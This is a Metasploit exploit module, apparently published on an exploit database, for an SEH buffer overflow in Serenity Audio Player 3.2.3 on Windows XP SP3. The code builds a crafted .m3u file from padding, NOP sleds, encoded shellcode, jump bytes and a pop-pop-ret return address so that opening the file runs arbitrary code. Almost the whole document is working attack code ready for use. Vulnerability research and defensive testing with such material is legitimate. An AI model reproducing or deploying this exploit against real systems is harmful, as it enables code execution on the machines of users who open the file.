# Exploit Title: Serenity Audio Player Buffer Overflow (Meta)
# Date: April 26, 2010
# Author: Blake
# Version: 3.2.3
# Tested on: Windows XP SP3

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking

    include Msf::Exploit::FILEFORMAT

    def initialize(info = {})
        super(update_info(info,
            'Name' => 'Serenity Audio Player Buffer Overflow Exploit',
            'Description' => %q{
                This module exploits a buffer overflow in Serenity Audio
Player versions 3.2.3 and below.
            By creating a specially crafted m3u file, an an attacker may be
able to execute arbitrary code.
            },
            'License' => MSF_LICENSE,
            'Author' =>
                [
                    'Blake',
                ],
            'Version' => '$Revision: 1 $',
            'References' =>
                [
                    [ 'URL', 'http://www.exploit-db.com/exploits/10226' ],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'seh',
                },
            'Payload' =>
                {
                    'Space' => 972,
                    'BadChars' => "\x00\x0a\x0d\x20\x0b\x1a",
                    'StackAdjustment' => -3500,
                },
            'Platform' => 'win',
            'Targets' =>
                [
                    [ 'Windows Universal', { 'Ret' => 0x00402593} ], # pop
edi; pop esi; ret - serenity.exe
                ],
            'Privileged' => false,
            'DisclosureDate' => 'Nov 11 2009',
            'DefaultTarget' => 0))

        register_options(
            [
                OptString.new('FILENAME', [ false, 'The file
name.','exploit.m3u']),
            ], self.class)
    end


    def exploit

        sploit = "http://"                    # header
        sploit << rand_text_alphanumeric(972 - payload.encoded.length)
        sploit << make_nops(10)                # nop sled 1
        sploit << payload.encoded            # shellcode
        sploit << make_nops(10)                # nop sled 2
        sploit << "\xe9\x4a\xfc\xff\xff"    # near jump -950
        sploit << "\xeb\xf9\x90\x90"        # short jump
        sploit << [target.ret].pack('V')    # p/p/r

        print_status("Creating '#{datastore['FILENAME']}' file ...")
        file_create(sploit)

    end

end
